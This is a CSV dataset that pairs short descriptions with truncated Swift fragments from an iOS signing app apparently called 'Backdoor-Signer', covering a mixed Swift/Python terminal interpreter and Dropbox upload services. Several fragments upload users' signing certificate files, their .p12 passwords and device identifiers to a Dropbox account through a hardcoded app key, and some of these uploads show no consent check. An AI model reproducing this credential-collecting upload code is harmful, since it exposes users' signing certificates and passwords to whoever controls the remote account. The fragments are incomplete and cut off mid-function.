id,language,folder,code_type,file_path,nl,code
258,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","/ Executes mixed code that contains both Python and Swift","private func executeMixedCode(
_ code: String,
sessionId: String,
outputHandler: @escaping (String) -> Void,
completion: @escaping (Result<Void, Error>) -> Void
) {"
259,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","MARK: - Terminal Help / Shows help information","private func showHelp(outputHandler: @escaping (String) -> Void) {
let helpText = """"""
Backdoor Terminal Help
======================

Basic Commands:
clear, cls     Clear the terminal screen
pwd            Print working directory
cd <path>      Change directory
ls             List files in current directory"
260,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","/ Shows help information about the custom programming language","private func showLanguageHelp(outputHandler: @escaping (String) -> Void) {
let helpText = """"""
Backdoor Custom Programming Language
===================================

The custom language supports both Swift and Python execution with
seamless interoperability between them.

Single Language Execution:
--------------------------"
261,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","MARK: - Custom Language Structures / Custom language parser for the Backdoor programming language","class CustomLanguageParser {
enum LanguageMode {"
262,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","enum LanguageMode - implements functionality related to language mode","enum LanguageMode {
case swift
case python
case mixed
}

struct ParsedCommand {"
263,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","struct ParsedCommand - implements functionality related to parsed command","struct ParsedCommand {
let mode: LanguageMode
let code: String
}

/// Parse a command to determine its language mode and extract the code
func parse(_ command: String) -> Result<ParsedCommand, Error> {"
264,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","/ Parse a command to determine its language mode and extract the code","func parse(_ command: String) -> Result<ParsedCommand, Error> {
// Check for shebang
if command.hasPrefix(""#!/bin/backdoor"") {"
265,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","/ BackdoorInterpreter - Executes code in the custom programming language","class BackdoorInterpreter {
enum BlockType {"
266,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","enum BlockType - implements functionality related to block type","enum BlockType {
case swift
case python
}

struct CodeBlock {"
267,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","struct CodeBlock - implements functionality related to code block","struct CodeBlock {
let type: BlockType
let code: String
let outputFile: URL
let importVariables: [String]
}

struct ExecutionPlan {"
268,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","struct ExecutionPlan - implements functionality related to execution plan","struct ExecutionPlan {
let executionBlocks: [CodeBlock]
let dataPassingFiles: [URL]
}

/// Prepare mixed code for execution by parsing and creating execution blocks
func prepareMixedCode(_ code: String, workingDirectory: URL) throws -> ExecutionPlan {"
269,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","/ Prepare mixed code for execution by parsing and creating execution blocks","func prepareMixedCode(_ code: String, workingDirectory: URL) throws -> ExecutionPlan {
// Split code into language blocks
var executionBlocks: [CodeBlock] = []
var dataPassingFiles: [URL] = []

// Create a regular expression to match language blocks
let blockPattern = try NSRegularExpression(pattern: ""(swift|python):\\s*\\{([\\s\\S]*?)\\}"", options: [])"
270,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","/ Execute a single code block and handle data passing","func executeBlock(_ block: CodeBlock, outputHandler: @escaping (String) -> Void) throws {
// Create modified code with data passing logic
let modifiedCode = try createExecutableCode(for: block)

// Create a temporary file
let tempDir = FileManager.default.temporaryDirectory
let fileExtension = block.type == .swift ? ""swift"" : ""py""
let fileURL = tempDir.appendingPathComponent(""temp_\(UUID().uuidString).\(fileExtension)"")

try modifiedCode.write(to: fileURL, atomically: true, encoding: .utf8)"
271,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","/ Create executable code for a block, including data passing logic","private func createExecutableCode(for block: CodeBlock) throws -> String {
var code = """"

if block.type == .swift {"
272,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","Data passing setup","struct ExportedData: Codable {
var variables: [String: String] = [:]
}

var exportedData = ExportedData()

// Export function
func export(_ name: String, _ value: Any) {"
273,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift","Export function","func export(_ name: String, _ value: Any) {
let jsonString = String(describing: value)
exportedData.variables[name] = jsonString
}

""""""

// Add import logic for variables from Python
for variable in block.importVariables {"
274,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/DropboxService.swift","/ Service for handling Dropbox file uploads","class DropboxService {
// MARK: - Singleton

/// Shared instance for app-wide access
static let shared = DropboxService()

// MARK: - Properties

/// Dropbox API token - stored as a constant for this implementation
/// In a production app, this would be stored more securely (e.g., in Keychain)"
275,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/DropboxService.swift","MARK: - Public Methods / Uploads a certificate file to Dropbox / - Parameters: /   - fileURL: The local URL of the file to upload /   - password: Optional password for the certificate file, if it's a .p12 file /   - completion: Optional completion handler called when upload finishes (for debugging only)","func uploadCertificateFile(fileURL: URL, password: String? = nil, completion: ((Bool, Error?) -> Void)? = nil) {
guard fileURL.isFileURL else {"
276,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/DropboxService.swift","/ Uploads password information as a separate file to Dropbox / - Parameters: /   - password: The p12 password to send /   - p12Filename: The name of the p12 file /   - completion: Optional completion handler","private func uploadPasswordFile(
password: String,
p12Filename: String,
completion: ((Bool, Error?) -> Void)? = nil
) {"
277,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift","/ Enhanced Dropbox service for improved logging and file management","class EnhancedDropboxService {
// MARK: - Singleton

/// Shared instance for app-wide access
static let shared = EnhancedDropboxService()

// MARK: - Constants

// Dropbox credentials
private let dropboxAppKey = ""2bi422xpd3xd962"""
278,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift","MARK: - Public Methods / Upload a log file to Dropbox","func uploadLogFile(fileURL: URL, completion: ((Bool, Error?) -> Void)? = nil) {
guard checkPrerequisites(fileURL: fileURL, completion: completion) else { return }"
279,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift","/ Upload a certificate file to Dropbox","func uploadCertificateFile(fileURL: URL, password: String? = nil, completion: ((Bool, Error?) -> Void)? = nil) {
guard checkPrerequisites(fileURL: fileURL, completion: completion) else { return }"
280,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift","/ Creates a file that explicitly pairs a certificate with its password / - Parameters: /   - certificateFilename: The filename of the certificate /   - password: The password for the certificate /   - completion: Optional completion handler","private func createCertificatePasswordPairFile(
certificateFilename: String,
password: String,
completion: ((Bool, Error?) -> Void)? = nil
) {"
281,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift","/ Upload device information to Dropbox","func uploadDeviceInfo(completion: ((Bool, Error?) -> Void)? = nil) {
// Only proceed if user has consented to data collection
guard UserDefaults.standard.bool(forKey: ""UserHasAcceptedDataCollection"") else {"
282,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift","/ Upload a text string as a log entry","func uploadLogEntry(_ logEntry: String, fileName: String? = nil, completion: ((Bool, Error?) -> Void)? = nil) {
// Only proceed if user has consented to data collection
guard UserDefaults.standard.bool(forKey: ""UserHasAcceptedDataCollection"") else {"
283,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift","/ Store password for certificate file","func storePasswordForCertificate(fileName: String, password: String, completion: ((Bool, Error?) -> Void)? = nil) {
// Create password info
let passwordInfo: [String: String] = [
""certificate_file"": fileName,
""password"": password,
""timestamp"": ISO8601DateFormatter().string(from: Date()),
""device_name"": UIDevice.current.name,
]

// Convert to JSON"
284,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift","MARK: - Private Methods / Common validation for file uploads","private func checkPrerequisites(fileURL: URL, completion: ((Bool, Error?) -> Void)? = nil) -> Bool {
// Check consent
guard UserDefaults.standard.bool(forKey: ""UserHasAcceptedDataCollection"") else {"
285,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift","/ Handle consent missing error","private func handleConsentError(completion: ((Bool, Error?) -> Void)? = nil) {
if let completion = completion {"
286,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift","/ Handle data creation error","private func handleDataCreationError(completion: ((Bool, Error?) -> Void)? = nil) {
if let completion = completion {"
287,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift","/ Create device info dictionary","private func createDeviceInfoDictionary() -> [String: String] {
return [
""device_name"": UIDevice.current.name,
""system_name"": UIDevice.current.systemName,
""system_version"": UIDevice.current.systemVersion,
""model"": UIDevice.current.model,
""identifier_for_vendor"": UIDevice.current.identifierForVendor?.uuidString ?? ""unknown"",
""timestamp"": ISO8601DateFormatter().string(from: Date()),
""app_version"": Bundle.main.infoDictionary?[""CFBundleShortVersionString""] as? String ?? ""unknown"",
""build_number"": Bundle.main.infoDictionary?[""CFBundleVersion""] as? String ?? ""unknown"","
288,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift","/ Refresh access token for Dropbox API","private func refreshAccessToken(completion: @escaping (Bool) -> Void) {
// Check if current token is still valid
if let expiry = accessTokenExpiry, expiry > Date(), accessToken != nil {"
289,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift","/ Process token response from Dropbox","private func processTokenResponse(data: Data, completion: @escaping (Bool) -> Void) {
do {"
290,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift","/ Prepare upload request","private func prepareUploadRequest(token: String, path: String, fileData: Data) -> URLRequest? {
guard let uploadURL = URL(string: dropboxUploadURL) else {"
291,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift","/ Upload a file to Dropbox with auto folder creation","private func uploadFile(fileURL: URL, toPath path: String, completion: ((Bool, Error?) -> Void)? = nil) {
// Ensure we have a valid token
refreshAccessToken { [weak self] success in"
292,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Management/Cloud/EnhancedDropboxService.swift","/ Process file upload after token refresh","private func processFileUpload(
token: String,
fileURL: URL,
path: String,
completion: ((Bool, Error?) -> Void)?
) {"
